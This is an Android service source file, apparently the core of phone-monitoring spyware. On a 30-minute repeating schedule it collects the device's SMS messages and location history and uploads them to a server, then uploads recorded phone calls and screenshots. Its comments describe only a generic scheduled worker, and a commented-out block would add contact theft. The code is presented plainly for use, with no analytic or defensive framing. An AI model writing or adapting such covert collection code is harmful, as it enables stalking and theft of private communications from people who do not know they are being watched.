package com.sunnet.service.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.sunnet.service.db.DatabaseHelper;
import com.sunnet.service.db.entity.CallVoiceEntity;
import com.sunnet.service.db.entity.CaptureEntity;
import com.sunnet.service.db.entity.LocationEntity;
import com.sunnet.service.db.entity.SMSEntity;
import com.sunnet.service.log.Log;
import com.sunnet.service.task.request.RequestHelper;
import com.sunnet.service.util.ThreadPool;

import java.util.ArrayList;
import java.util.List;

/**
 * This {@code IntentService} does the app's actual work.
 * {@code SampleAlarmReceiver} (a {@code WakefulBroadcastReceiver}) holds a
 * partial wake lock for this service while the service does its work. When the
 * service is finished, it calls {@code completeWakefulIntent()} to release the
 * wake lock.
 */
public class SchedulingService extends Service {

    public static final String ACTION_SCHEDULING = "com.sunnet.service.service.action.scheduling";
    public static final long TIME_DELAY = 60 * 1000 * 30; // 30m
    private Runnable runnable;
    private Handler handler;
    private final IBinder mBinder = new LocalBinder();

    public class LocalBinder extends Binder {
        public SchedulingService getService() {
            return SchedulingService.this;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (intent != null) {

            String action = intent.getAction();
            if (action != null && action.equals(ACTION_SCHEDULING)) {
                Log.v("ACTION_SCHEDULING");

                ThreadPool.doDatabase(new Runnable() {
                    @Override
                    public void run() {
                        List<SMSEntity> smsListFromDb = DatabaseHelper.getAllSmsFromDb();
                        List<SMSEntity> smsListFromDevice = DatabaseHelper.getAllSmsFromDevice();
                        if (smsListFromDb == null)
                            smsListFromDb = new ArrayList<>();
                        if (smsListFromDevice == null)
                            smsListFromDevice = new ArrayList<>();
                        //-- Filter new sms
                        List<SMSEntity> newSmsList = new ArrayList<>();
                        for (SMSEntity sms : smsListFromDevice) {
                            if (!smsListFromDb.contains(sms)) {
                                newSmsList.add(sms);
                            }
                        }
                        List<SMSEntity> smsPushToServer = new ArrayList<>();
                        for (SMSEntity sms : smsListFromDb) {
                            if (sms.getStatus() == 0) {
                                smsPushToServer.add(sms);
                            }
                        }
                        smsPushToServer.addAll(newSmsList);
                        DatabaseHelper.createAllSms(newSmsList);
                        Log.i("SMS list: " + smsPushToServer.size());
                        RequestHelper.updateSmsToServer(smsPushToServer);

                        //-- Upload location - get data from Database
                        List<LocationEntity> locationList = DatabaseHelper.getAllLocationFromDb();
                        Log.i("Location list: " + (locationList != null ? locationList.size() : 0));
                        RequestHelper.updateLocationToServer(locationList);
                    }
                });
//                //-- Upload contact - get data from Database
//                List<ContactEntity> contactListFromDb = DatabaseHelper.getAllContactFromDb();
//                List<ContactEntity> contactListFromDevice = DatabaseHelper.getAllContactFromDevice();
//                if (contactListFromDb == null)
//                    contactListFromDb = new ArrayList<>();
//                if (contactListFromDevice == null)
//                    contactListFromDevice = new ArrayList<>();
//                //-- Filter new contact
//                List<ContactEntity> newContactList = new ArrayList<>();
//                for (ContactEntity contact : contactListFromDevice) {
//                    if (!contactListFromDb.contains(contact)) {
//                        newContactList.add(contact);
//                    }
//                }
//                List<ContactEntity> contactPushToServer = new ArrayList<>();
//                for (ContactEntity contact : contactListFromDb) {
//                    if (contact.getStatus() == 0) {
//                        contactPushToServer.add(contact);
//                    }
//                }
//                contactPushToServer.addAll(newContactList);
//                DatabaseHelper.createAllContact(newContactList);
//                Log.i("Contact list: " + contactPushToServer.size());
//                RequestHelper.updateContactToServer(contactPushToServer);

                ThreadPool.doUpload(new Runnable() {
                    @Override
                    public void run() {
                        //-- Upload call voice - get data from Database
                        List<CallVoiceEntity> callVoiceList = DatabaseHelper.getAllCallVoiceFromDb();
                        Log.i("CallVoice list: " + (callVoiceList != null ? callVoiceList.size() : 0));
                        if (callVoiceList != null && callVoiceList.size() > 0) {
                            for (final CallVoiceEntity entity : callVoiceList) {
                                RequestHelper.uploadCallVoiceToServer(entity);
                                /*try {
                                    Thread.sleep(1500);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }*/

                            }
                        }

                        //-- Upload screenshot - get data from Database
                        List<CaptureEntity> captureList = DatabaseHelper.getAllCaptureFromDb();
                        Log.i("Capture list: " + (captureList != null ? captureList.size() : 0));
                        if (captureList != null && captureList.size() > 0) {
                            for (final CaptureEntity entity : captureList) {
                                RequestHelper.updateScreenshotToServer(entity);
                                   /* try {
                                        Thread.sleep(1500);
                                    } catch (InterruptedException e) {
                                        e.printStackTrace();
                                    }*/
                            }
                        }
                    }
                });
            }
        }
        return START_STICKY;
    }


    private void startAlarm(Context context) {
        Intent intent = new Intent(context, SchedulingService.class);
        intent.setAction(ACTION_SCHEDULING);
        startService(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (handler != null && runnable != null) {
            handler.removeCallbacks(runnable);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.v("onCreate(SchedulingService)");

        handler = new Handler();
        runnable = new Runnable() {
            @Override
            public void run() {
                Log.v("==> (StartAlarm) <==");
                startAlarm(SchedulingService.this);
                handler.postDelayed(runnable, TIME_DELAY);
            }
        };

        runnable.run();
    }

}
